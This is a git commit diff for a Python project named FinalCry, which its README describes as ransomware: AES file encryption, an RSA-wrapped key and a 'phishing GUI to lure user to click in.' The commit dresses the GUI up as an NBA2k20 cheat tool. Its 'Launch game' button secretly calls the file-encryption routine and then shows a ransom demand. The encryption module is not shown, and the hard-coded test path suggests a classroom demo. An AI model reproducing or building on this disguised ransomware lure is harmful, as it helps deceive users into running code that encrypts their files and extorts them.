36a6696527a353717c3288e2a03076f407adcf4a
Boming(Tony) Zhang <bz15@hampshire.edu>
2020-07-04 13:50:31 -0400

    added demo GUI

--- Code/FinalCry/README.md
+++ Code/FinalCry/README.md
@@ -4,3 +4,4 @@
 1. AES encryption for local targeted files.
 2. AES key is encrypted with RSA.
 3. Phishing GUI to lure user to click in.
+4. NBA2k20 GUI![](/src/demo/GUI.png)
--- Code/FinalCry/src/main.py
+++ Code/FinalCry/src/main.py
@@ -2,18 +2,25 @@
 from appJar import gui
 import ransomware
 
-key = "foopassword"
+key = "test"
 path = "D:\\test\\"
 # handle button events
+app = gui("NBA2k20 hacking tool", "800x900")
 def press(button):
-    if (button == "Encrypt"):
+    if (button == "Launch game"):
         ransomware.encrypt_files(path, key)
+        app.setImage("thumbnail", "hacked.gif")
+        app.addButton("Decrypt", press)
+        app.setLabel("title", "All you files have been encrypted!\n Buy me a UMass Dinning card or you lose your files!")
+
+        app.addLabelEntry("Key")
     elif(button == "Decrypt"):
-        ransomware.decrypt_files(path, key)
+        pwd = app.getEntry("Key")
+        ransomware.decrypt_files(path, pwd)
 
 def createGUI():
     # create a GUI variable called app
-    app = gui("NBA2k20 hacking tool", "600x700")
+
     app.setBg("grey")
     app.setFont(18)
 
@@ -23,14 +30,17 @@ def createGUI():
     app.addLabel("title", "NBA2k20 gameplay editor")
     app.setLabelFg("title", "white")
 
-    app.check("max speed")
-    app.check("max vertical")
-    app.check("unlimited stamina")
-    app.check("green shot")
+    app.check("Max speed")
+    app.check("Max vertical")
+    app.check("Unlimited stamina")
+    app.check("Green shot")
     app.check("100% shot success")
+    app.check("No fatigue")
+    app.check("Freeze shot clock")
+    app.check("All scores count toward player")
 
     # link the buttons to the function called press
-    app.addButtons(["Encrypt", "Decrypt"], press)
+    app.addButtons(["Launch game"], press)
 
 
     # start the GUI
